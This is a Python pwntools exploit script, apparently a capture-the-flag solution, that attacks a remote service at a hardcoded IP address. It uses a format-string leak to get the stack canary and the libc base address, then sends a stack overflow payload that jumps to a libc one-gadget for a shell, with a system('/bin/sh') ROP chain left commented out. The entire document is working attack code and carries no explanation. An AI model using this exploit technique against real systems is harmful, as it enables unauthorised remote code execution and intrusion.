from pwn import *


FILE = "./chall"

_LIBC = "libc-2.27.so"
#_LIBC = "/usr/lib/x86_64-linux-gnu/libc-2.30.so"
#_LIBC = "/lib/x86_64-linux-gnu/libc-2.27.so"

BINARY = ELF(FILE, checksec=False)
LIBC   = ELF(_LIBC, checksec=False)
#p = process(FILE) #, env={"LD_PRELOAD": _LIBC})
p = remote("69.172.229.147", 9002)
'''gdb.attach(p, """
b *main+112
c
""")'''
sleep(1)
payload1 = "%p."*20

p.sendline(payload1)
data = p.recvline().decode("latin-1")

data = data.split(".")

canary = data[13]

leak = data[15]

__libc_start_main = int(leak[2:], 16) - 231

LIBC.address = __libc_start_main - LIBC.sym['__libc_start_main'] + LIBC.address

log.info("Libc Base: " + str(hex(LIBC.address)))
log.info("canary: " + canary)

payload = b"\x00" + cyclic(71, n=8)
payload += p64(int(canary[2:], 16))

#rop = ROP(BINARY)
pop_rdi = LIBC.address + 0x00195bb9 #rop.find_gadget(["pop rdi", "ret"])[0]
log.info("pop rdi: " + str(hex(pop_rdi)))
binsh = next(LIBC.search(b"/bin/sh"))
payload += p64(0xdeadbeef)
payload += p64(LIBC.address + 0x4f322)  # one gadget
#payload += p64(pop_rdi) + p64(binsh) + p64(LIBC.sym["system"])  # + p64(LIBC.sym["exit"])

p.sendline(payload)
p.interactive()